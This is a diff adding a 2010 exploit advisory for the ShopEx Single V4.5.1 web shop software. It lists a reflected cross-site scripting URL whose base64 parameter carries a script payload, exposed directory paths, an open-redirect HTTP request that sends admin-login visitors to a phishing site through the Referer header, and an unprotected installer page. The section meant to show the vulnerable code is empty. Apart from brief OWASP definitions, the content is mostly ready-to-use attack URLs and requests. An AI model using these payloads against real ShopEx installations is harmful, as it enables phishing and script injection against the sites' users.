@@ -1,0 +1,43 @@
+# Exploit Title: ShopEx <= Single V4.5.1 Multiple Vulnerabilities
+# Date: 30/01/10
+# Author: cp77fk4r | empty0page[SHIFT+2]gmail.com| www.DigitalWhisper.co.il
+# Software Link: http://www.shopex.cn | http://www.shopex.cn/download/
+# Version: <= Single V4.5.1
+# Tested on: PHP
+#
+##[Cross Site Scripting]
+(Cross-Site Scripting attacks are a type of injection problem, in which malicious scripts are injected into the otherwise benign and trusted web sites. Cross-site scripting (XSS) attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user in the output it generates without validating or encoding it)
+http://server/?gOo=ZXJyb3IuZHd0&errinfo=PHNjcmlwdD5hbGVydCgiWFNTRUQiKTwvc2NyaXB0Pg==
+#
+#
+##[Directory Listing]
+http://server/syssite/home/
+http://server/icons/
+http://server/syssite/dfiles
+http://server/templates/
+http://server/syssite/shopadmin/images/
+http://server/syssite/shopadmin/user_guide/
+#
+#
+##[Open Redirection:]
+(OWASP: An open redirect is an application that takes a parameter and redirects a user to the parameter value without any validation. This vulnerability is used in phishing attacks to get users to visit malicious sites without realizing it.)
+The admin login page (http://server/syssite/shopadmin/login.php) redirect the none-authentication users
+the the "document.referrer" page. The attacker can exploit the mechanism to trick the victim like that:
+#
+#
+HTTP REQUEST:
+GET /syssite/shopadmin/login.php HTTP/1.1
+Host: [SERVER]
+Referer: http://www.PHISHING.com
+#
+the user will be sent to the original page but will be redirected to the PHISHING site.
+#
+the vulnerable code is: (in: http://server/syssite/shopadmin/login.php)
+#
+
+#
+#
+##[Unprotected Install Proccess:]
+http://server/syssite/install/home.htm
+#
+[e0f]
